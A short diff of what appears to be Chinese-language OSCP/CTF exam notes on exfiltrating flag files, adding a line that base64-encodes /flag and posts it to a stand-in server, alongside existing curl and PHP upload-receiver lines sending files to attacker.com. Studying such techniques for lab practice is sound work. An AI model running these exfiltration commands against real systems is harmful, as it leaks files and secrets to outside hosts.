@@ -88,6 +88,8 @@ curl -X POST http://attacker.com -F "file=@/etc/flag"
 <?php
 move_uploaded_file($_FILES['file']['tmp_name'], './stolen_flag.txt');
 ?>
+
+cat /flag | base64 | curl -X POST http://your-server.com:8000 -d @-
 三、Windows 环境下的外带补充
 OSCP 也会遇到 Windows 靶机，Windows 没有 xxd 和 curl（老版本），需要用其他命令：
 
